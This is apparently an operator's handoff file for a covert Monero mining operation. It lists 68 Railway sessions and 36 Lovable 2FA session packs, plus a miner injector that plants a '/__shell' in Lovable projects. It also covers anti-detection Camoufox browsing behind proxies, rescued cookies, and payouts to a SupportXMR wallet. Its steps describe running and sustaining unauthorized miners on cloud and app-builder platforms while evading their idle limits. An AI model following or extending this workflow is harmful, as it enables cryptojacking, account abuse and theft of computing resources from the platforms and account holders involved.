# Handoff — Railway Script3 (updated 2026-09-19)

**Status:** Fleet ready · bridge live · **pilot paused** before script3.  
**Bridge:** `wss://chimera-bridge-production-0703.up.railway.app` (**LIVE**). Old `0ef2` is dead.

Earlier sandbox Camoufox proof (2026-09-18) still valid for *technique*:
Camoufox + `HEADED=1` + xvfb + real chat wake + bare `*.lovableproject.com` + `/__shell` inject.
Production keep-alive = **service**, not sandbox (sandboxes idle-kill).

---

## Current fleet

| Piece | Value |
|---|---|
| Railway dirs | `/home/alae/Documents/railways/session-*` × **68** |
| Lovable 2FA | `automation-toolkit/scripts/sessions/` × **36 unique** |
| Injector | `miner_injector.py` → sysoptd **without** `--bridge` (default `0703`) |
| script3 | `BRIDGE_URL` must be `0703` |
| Wallet | `49J8k2f3…N1F` on SupportXMR |
| DB | `chimera-miner/data/database.json` (GitHub) — **no Mega** |

See root [`HANDOFF.md`](../HANDOFF.md) for full pipeline + pilot stop point.

---

## Pilot gate before script3

1. session-2 cookies rescued ✅  
2. script2 `--browser kernel` → project row in GitHub DB ❌ (paused mid-AI-wait; remixed id `84633151-04d4-4a46-a462-76f845d2958a` not saved)  
3. Then run script3 on one Railway **service**

---

## Run script3 on a Railway **service** (target)

1. Link healthy Railway session (`HOME=.../railways/session-N`)  
2. Upload chimera-miner + Lovable session pack + offline DB if needed  
3. `CAMOUFOX=1 HEADED=1` + proxy +  
   `python3 script3_launch_miner.py --session <N> --mode full`  
4. Confirm `/__shell` → worker → SupportXMR

Wake: real chat prompt required (no `SKIP_CHAT`) or shell stays 404.

---

## Do not

- Use bridge `0ef2`  
- Rely on sandboxes for 24/7 mining  
- Pass `--bridge` from inject (sysoptd default is correct)  
- Stack multiple Camoufox on one 1 GiB box  
- Use Mega/rclone for DB  
